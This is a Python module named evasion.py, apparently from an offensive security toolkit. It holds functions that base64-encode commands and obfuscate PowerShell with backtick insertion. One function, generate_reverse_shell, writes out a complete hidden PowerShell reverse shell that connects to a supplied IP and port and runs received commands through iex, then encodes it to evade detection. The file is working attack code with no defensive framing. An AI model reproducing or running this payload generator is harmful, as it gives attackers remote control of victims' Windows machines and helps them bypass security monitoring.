# modules/evasion.py

import base64
import os

OUTPUT_FILE = "outputs/evasion_results.txt"
os.makedirs("outputs", exist_ok=True)

def save_output(data):
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(data + "\n")

def encode_base64(command):
    encoded = base64.b64encode(command.encode()).decode()
    result = f"[Base64 Encoded]\n{encoded}"
    save_output(result)
    return encoded

def obfuscate_powershell(command):
    parts = command.split()
    obfuscated = " ".join([f"`{c[0]}`{c[1:]}" if c else "" for c in parts])
    result = f"[Obfuscated PowerShell]\n{obfuscated}"
    save_output(result)
    return obfuscated

def generate_reverse_shell(ip, port):
    shell = f'''
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
'''.strip()
    encoded = base64.b64encode(shell.encode()).decode()
    result = f"[ReverseShell PowerShell base64]\n{encoded}"
    save_output(result)
    return encoded
